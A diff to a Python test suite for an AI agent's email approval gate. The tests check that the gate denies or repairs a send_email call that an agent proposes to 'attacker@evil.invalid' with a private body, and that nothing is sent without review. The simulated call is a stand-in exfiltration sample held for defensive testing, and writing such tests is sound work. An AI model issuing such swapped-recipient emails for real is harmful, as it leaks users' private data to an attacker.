@@ -63,9 +63,20 @@ def test_review_endpoint_rejects_nonboolean_and_unknown_approvals(monkeypatch):
 
 
 def test_a_denied_gate_action_never_creates_an_approvable_draft():
-    box,r=attempt('Email the policy to hr@northwind.example.',
+    # Role-only prompt: the gate has no single typed address to restore, so DENY.
+    box,r=attempt('Email the policy to hr.',
                   [[('send_email',{'to':'attacker@evil.invalid','subject':'Policy','body':'Private'})]])
     assert r['pending']==[] and r['sent']==[] and box.sent==[]
+
+
+def test_a_repaired_swap_queues_the_users_recipient_for_review_not_the_attackers():
+    # gate-v2: the user typed one address, the agent proposed the attacker's. The
+    # draft awaiting review carries the user's address and nothing goes out yet.
+    box,r=attempt('Email the policy to hr@northwind.example.',
+                  [[('send_email',{'to':'attacker@evil.invalid','subject':'Policy','body':'Private'})]])
+    assert len(r['pending'])==1 and r['pending'][0]['to']=='hr@northwind.example'
+    assert 'attacker' not in str(r['pending'][0])
+    assert r['sent']==[] and box.sent==[]
 
 
 def test_model_retries_do_not_create_duplicate_drafts():
